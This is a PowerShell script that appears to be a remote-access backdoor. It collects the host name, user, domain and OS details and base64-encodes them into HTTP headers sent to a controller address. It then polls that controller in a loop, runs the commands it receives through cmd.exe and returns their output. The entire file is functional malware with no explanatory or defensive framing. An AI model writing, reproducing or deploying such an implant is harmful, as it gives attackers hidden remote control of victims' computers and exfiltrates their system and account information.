
$delay = 1

function fscx {
    param ($data)
    $pinfo = New-Object System.Diagnostics.ProcessStartInfo
    $pinfo.FileName = "cmd.exe"
    $pinfo.RedirectStandardError = $true
    $pinfo.RedirectStandardOutput = $true
    $pinfo.UseShellExecute = $false
    $pinfo.Arguments = "/c $data"
    $p = New-Object System.Diagnostics.Process
    $p.StartInfo = $pinfo
    $p.Start() | Out-Null
    $p.WaitForExit()
    $stdout = $p.StandardOutput.ReadToEnd()
    $stderr = $p.StandardError.ReadToEnd()
    if ($p.ExitCode -ne 0) {
        $res = $stderr
    } else {
        $res = $stdout
    }
    return $res
}

function sprya_request  {
    param($data,$type)
    try  {
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.add('TYPE','L33T')
        $webClient.Headers.add('DATA',$data)
        $webClient.DownloadString("http://$addr/$type/")
    } catch { }
}

function encode_b64 {
    param($data)
    $data = [System.Text.Encoding]::UTF8.GetBytes($data)
    return [System.Convert]::ToBase64String($data)
}

try {
    $w32wmi =  (Get-WmiObject Win32_OperatingSystem)
    $pcname = $w32wmi.CSName
    try { $os = ($w32wmi.name).split("|")[0] } catch { $os = $w32wmi.name  }
    $domain = $w32wmi.Domain
    $bits = $w32wmi.OSArchitecture
    $user = [Environment]::UserName
} catch { }

$rp = sprya_request -data (encode_b64 -data ("$pcname;$user;$domain;$os;$bits")) -type "start"
if($rp -eq "1") {
    $l = $true
    while($l) {
        $response = sprya_request -data (encode_b64 -data ("$pcname")) -type "check"
        if ($response -like "*:*") {
            $type = $response.split(":")[0]
            $command = $response.split(":")[1]
            if($type -eq "shell") {
                $c = fscx -data $command
                sprya_request -data (encode_b64 -data ($c)) -type "return"
           
            }
        }
        if ($response -eq "test") {
            sprya_request -data (encode_b64 -data ("H33l0 MR L33T")) -type "return"
        }
        if ($response -eq "quit") {
            break
        }
        start-sleep -Seconds $delay
    }
}